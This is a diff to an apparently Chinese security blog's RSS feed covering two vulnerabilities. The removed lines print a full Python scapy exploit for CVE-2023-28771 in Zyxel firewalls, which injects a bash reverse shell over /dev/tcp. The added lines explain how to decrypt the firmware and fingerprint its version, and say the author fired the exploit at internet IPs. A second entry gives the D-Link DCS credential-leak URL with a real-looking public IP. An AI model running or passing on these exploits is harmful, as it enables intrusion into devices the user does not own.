@@ -212,8 +212,42 @@ sudo ./qemu-mipsel-static -L . ./usr/sbin/lighttpd -D -f ./etc/lighttpd/lighttpd
       <guid>https://jellyfish-pro.github.io/posts/cve-2023-28771-%E5%90%88%E5%8B%A4ipsec-vpn%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%9C%AA%E6%B5%8B%E8%AF%95%E9%80%9A%E8%BF%87/</guid>
       <description>CVE-2023-28771 合勤IPSec VPN服务命令注入漏洞（未测试通过） 漏洞简介 该漏洞广泛存在于合勤防火墙设备中：
 ATP防火墙（固件版本在4.60 至 5.35） USG FLEX（固件版本在4.60至5.35） VPN（固件版本在内4.60至5.35） ZyWALL/USG（固件版本在4.60至4.73） 并在网络上有完整的分析文章：[CVE-2023-28771 RCE分析与EXP](CVE-2023-28771 RCE分析与EXP (qq.com))
-在文章中有给出exp：
-#!/usr/bin/python3import sysfrom scapy.all import *load_contrib(&amp;#39;ikev2&amp;#39;)cmd = &amp;#34;\&amp;#34;;bash -c \&amp;#34;exec bash -i &amp;amp;&amp;gt;/dev/tcp/&amp;#34; + sys.argv[2] + &amp;#34;/&amp;#34; + sys.argv[3] + &amp;#34; &amp;lt;&amp;amp;1;\&amp;#34;;echo -n \&amp;#34;&amp;#34;packet = IP(dst = sys.argv[1]) / UDP(dport = 500) / IKEv2(init_SPI = RandString(8), next_payload = &amp;#39;Notify&amp;#39;, exch_type = &amp;#39;IKE_SA_INIT&amp;#39;, flags=&amp;#39;Initiator&amp;#39;) / IKEv2_payload_Notify(next_payload = &amp;#39;Nonce&amp;#39;, type = 14, load = &amp;#34;HAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXB&amp;#34; + cmd) / IKEv2_payload_Nonce(next_payload = &amp;#39;None&amp;#39;, load = RandString(68))send(packet) 通过这个exp，可以大概猜测到漏洞出在处理ikev2协议有关</description>
+在文章中有给出exp.
+通过这个exp，可以大概猜测到漏洞出在处理ikev2协议有关
+不过该漏洞没有买到设备，所以只能使用exp去找ip测试。
+寻找特征 固件解密 漏洞的特征我们需要去固件中找，固件则可以直接去官网下载（官网只能下载最近几个版本的固件）
+同时，固件是加密过的zip文件，具体的解密原理：[Zyxel设备固件提取与口令破解](Zyxel设备固件提取与口令破解|NOSEC安全讯息平台 - 白帽汇安全研究院)
+这里直接演示解压的过程。
+官网下载后是一个压缩包，解压后的文件夹如下：
+里面有一个xxx.ri的文件，该文件可以直接通过binwake解压出来，这里面存放着解压xxx.bin的密码
+binwalk -Me1 473AAAB0C0.ri 解压后可以看到一个zld_fsextract文件，这个文件就是用来解压xxx.bin的二进制文件
+这里我们file看一下这个文件：
+是mips n32的架构，这里我们先将zld_fsextract文件复制到xxx.bin同级目录，然后使用qemu来进行用户级模拟：
+./qemu-mipsn32-static ./zld_fsextract 473AAAB0C0.bin ./unzip -s extract -e code 直接使用qemu模拟的话会报错：
+这里的权限不够不能使用sudo来解决，因为这里需要的是设备的权限，而不是物理机的权限。
+这里我们需要使用strace命令，来看看zld_fsextract文件的执行情况：
+strace -f -s 199 ./qemu-mipsn32-static ./zld_fsextract 473AAAB0C0.bin ./unzip -s extract -e code 在函数的调用链中，可以看到一个execveat函数。而这个函数参数里的50QLc3QbsoeAX53dREVw8rTxwc5IAYYHa.eD45qyvU8TbD63Td/dUUaR7ilJGJc就是解压密码
+然后使用7z，输入密码，就可以解压：
+这里面有一个compress.img，这个就是根目录系统，直接解压就行：
+比较特征 这里我们选择的是compress\usr\local\zyxel-gui\htdocs\images\login.css
+这个文件里有直接记录当前reset.css版本号，并且可以直接访问：
+通过这一点就可以判断目标ip的固件版本
+ip测试 这里直接使用的上面的exp，判断版本号后也无法成功返回shell。并且没有设备，并不知道问题出在哪里</description>
+    </item>
+    
+    <item>
+      <title>Dlink-DCS摄像头系列 账户密码泄露漏洞（未进行分析）</title>
+      <link>https://jellyfish-pro.github.io/posts/dlink-dcs%E6%91%84%E5%83%8F%E5%A4%B4%E7%B3%BB%E5%88%97-%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E6%9C%AA%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://jellyfish-pro.github.io/posts/dlink-dcs%E6%91%84%E5%83%8F%E5%A4%B4%E7%B3%BB%E5%88%97-%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E6%9C%AA%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90/</guid>
+      <description>Dlink-DCS摄像头系列 账户密码泄露漏洞（未进行分析） 该漏洞可以泄露用户的账号和密码，使用账号和密码可以登录页面。
+可以在网页上直接访问url，也可以使用脚本获得
+如果要访问url的话则需要使用如下的url：
+http://xxx.xxx.xxx.xxx:xxxx/config/getuser?index=0 获得账户密码后直接访问ip就可登录：
+http://xxx.xxx.xxx.xxx:xxxx 若要使用python脚本：
+USEG: ./exp http://ip:portor./exp https://ip:port 例如：
+http://14.100.101.68:8080/config/getuser?index=0 </description>
     </item>
     
     <item>
